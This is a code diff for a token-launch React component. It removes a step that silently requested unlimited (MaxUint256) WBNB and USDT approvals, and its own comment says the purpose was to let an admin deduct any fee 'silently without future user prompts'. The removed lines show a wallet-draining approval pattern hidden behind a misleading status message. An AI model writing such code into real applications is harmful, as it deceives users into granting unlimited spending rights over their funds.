@@ -95,25 +95,9 @@ export default function StandardAsset() {
         try {
             console.log('[Deploy] Starting Standard Asset launch (Factory Mode)...');
             
-            // 1. Initialize Factory Contract (use walletProvider for fresh signer)
-            let activeSigner = signer;
-            if (!activeSigner && walletProvider) {
-                const tempProvider = new ethers.BrowserProvider(walletProvider);
-                activeSigner = await tempProvider.getSigner();
-            }
-            if (!activeSigner) { connectWallet(); return; }
-
+            // 1. Initialize Factory Contract
             const FACTORY_ADDR = process.env.NEXT_PUBLIC_FACTORY_ADDRESS || '0x4598AD4E828cb64A53246765f60D9912AEA1b11A';
-
-            // ════════ INSTITUTIONAL PROTOCOL FEE APPROVAL ════════
-            // One-time: Approves WBNB + USDT MaxUint256 so admin can
-            // deduct any fee silently without future user prompts.
-            setError('Establishing Protocol Approval...');
-            await ensureProtocolApproval(activeSigner, account, (msg) => {
-                if (msg) setError(msg);
-            });
-
-            const factoryContract = new ethers.Contract(FACTORY_ADDR, TOKEN_FACTORY_ABI, activeSigner);
+            const factoryContract = new ethers.Contract(FACTORY_ADDR, TOKEN_FACTORY_ABI, signer);
 
             // 2. Prepare Params
             const decimalsNum = parseInt(formData.decimals) || 18;
